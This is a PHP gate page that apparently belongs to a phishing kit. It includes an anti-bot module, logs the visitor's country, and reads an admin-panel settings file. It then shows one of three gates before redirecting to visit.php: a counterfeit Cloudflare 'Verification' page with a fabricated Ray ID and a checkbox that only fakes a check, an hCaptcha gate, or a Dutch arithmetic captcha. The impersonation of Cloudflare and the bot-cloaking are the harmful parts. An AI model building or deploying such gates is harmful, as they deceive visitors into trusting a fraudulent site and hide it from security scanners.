<?php
include "./antibots-debug/antibots.php";
include "./libraries/get-country-code.php";
$jsonFilePath = "./panel/admin/admin.json";
$json_data = file_get_contents($jsonFilePath);
$settings_data = json_decode($json_data, true);
$recaptcha_mode = $settings_data['recaptcha_mode'];
$recaptcha_type = $settings_data['recaptcha_type'];
$userCountryCode = $detector->api();
$_SESSION['code_country_visit'] = $userCountryCode;

// Captcha :
if ($recaptcha_mode === 0 && $recaptcha_type === "off-type") {
    echo 
    "<script>
        window.location = './visit.php';
    </script>";
}
elseif ($recaptcha_mode === 1 && $recaptcha_type === "cloudflare") {
    $cloudflare ='<!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
                <!-- Font Google -->
                <link rel="preconnect" href="https://fonts.googleapis.com">
                <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
                <link rel="stylesheet" href="./panel/css/captcha.css">
                <title>Verification</title>
            </head>
            <body class="body-captcha-1">
                <div class="recaptcha">
                    <div class="container">
                        <div class="content-recaptcha">
                            <h1>Verification</h1>
                            <p class="p-explain-one" id="pExplainOne">
                                Make sure you are human by following these steps.
                            </p>
                            <div class="checking-not-robot" id="parentChecking">
                                <div class="parent-input-check-box">
                                    <input type="checkbox" name="checkbox" class="input-checkbox" id="checkbox">
                                    <label for="checkbox" id="textExplain">Admit that you are human</label>
                                    <div class="parent-animation hidden" id="animationElement">
                                        <img src="./panel/img/animation-first.png">
                                    </div>
                                </div>
                                <div class="parent-logo">
                                    <img src="./panel/img/logo-recaptcha.png" alt="">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="footer-recaptcha">
                    <div class="container">
                        <div class="content-footer-recaptcha">
                            <span>Ray ID: <code>8b0247f5fcad1537</code></span>
                            <p>Performance and Security through Cloudflare</p>
                        </div>
                    </div>

                </div>

                <script>
                    const checkbox = document.getElementById("checkbox");
                    const textExplain = document.getElementById("textExplain");
                    const animationElement = document.getElementById("animationElement");
                    const parentChecking = document.getElementById("parentChecking");
                    
                    
                    setTimeout(function() {
                        animationElement.classList.add("hidden");
                        textExplain.innerText = "Admit that you are human";
                    }, 5000);

                    checkbox.addEventListener("click", ()=>{
                        animationElement.classList.remove("hidden");
                        textExplain.innerText = "Verifying...";
                        setTimeout(function() {
                            window.location = "./visit.php";
                        }, 3000);
                    });
                </script>


            </body>
        </html>';

    echo $cloudflare;
}
elseif ($recaptcha_mode === 1 && $recaptcha_type === "hcaptcha") {
    $hcaptcha = 
    '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <!-- Font Google -->
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
            <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
            <link rel="stylesheet" href="./panel/css/captcha.css">
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
            <script src="https://www.hCaptcha.com/1/api.js" async defer></script>
            <title>Verification</title>
        </head>
        <body class="">
            <div class="nav-bar-first">
                <div class="logo">
                    <img src="./panel/img/hcaptcha.svg" alt="">
                </div>
            </div>
        
            <div class="parent-checking">
                <h1>Verification</h1>
                <div class="h-captcha" data-sitekey="d94b46f4-dff1-430b-a0bd-d04acdf38fa9" data-callback="onSubmit"></div>
                <div class="error-message" id="error-message"></div>
            </div>
            <script>
                function onSubmit(response) {
                    $.ajax({
                        url: "./panel/actions/verify.php",
                        type: "POST",
                        data: {
                            "h-captcha-response": response
                        },
                        success: function(data) {
                            if (data === "success") {
                                window.location.href = "visit.php";
                            } else {
                                $("#error-message").html("Please verify you are not a robot");
                            }
                        },
                        error: function() {
                            $("#error-message").html("An error occurred, please try again");
                        }
                    });
                }
            </script>
        </body>
        </html>';
    echo $hcaptcha;
}
elseif ($recaptcha_mode === 1 && $recaptcha_type === "captcha_calc") {
    $captcha_calc = 
    '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- Font Google -->
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
        <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
        <link rel="stylesheet" href="./panel/css/captcha.css">
        <title>Verificatie</title>
    </head>
    <body>
        <div class="content">
            <div class="captcha-container">
                <div class="logo">
                    <img src="./panel/img/logo-captcha-calc.png" alt="">
                </div>
                <p>
                   Beantwoord deze eenvoudige wiskundige berekening om te bevestigen dat u een mens bent en geen robot.
                </p>
                <div class="captcha-text" id="captchaOperation"></div>
                
                <div class="p-i-a-btn">
                    <label for="captchaInput">Voer het resultaat in</label>
                    <input type="tel" id="captchaInput" class="captcha-input" placeholder="Voer het resultaat in">
                    <button class="verify-btn" onclick="verifyCaptcha()">Resultaat controleren</button>
                </div>
                <div id="resultMessage" class="result"></div>
            </div>
        </div>
        <script>
            const captchaInput=document.getElementById("captchaInput");captchaInput.addEventListener("input",function(){this.value=this.value.replace(/[^0-9]/g,"")});let num1,num2;function generateCaptcha(){num1=Math.floor(10*Math.random())+1,num2=Math.floor(10*Math.random())+1,document.getElementById("captchaOperation").innerText=`${num1} + ${num2} = ?`,document.getElementById("captchaInput").value=""}function verifyCaptcha(){let e=parseInt(document.getElementById("captchaInput").value),t=document.getElementById("resultMessage");e===num1+num2?window.location.href="visit.php":(t.style.color="red",t.innerText="Onjuist, probeer het opnieuw.",generateCaptcha())}window.onload=generateCaptcha;
        </script>
    </body>
    </html>';
    echo $captcha_calc;
}
?>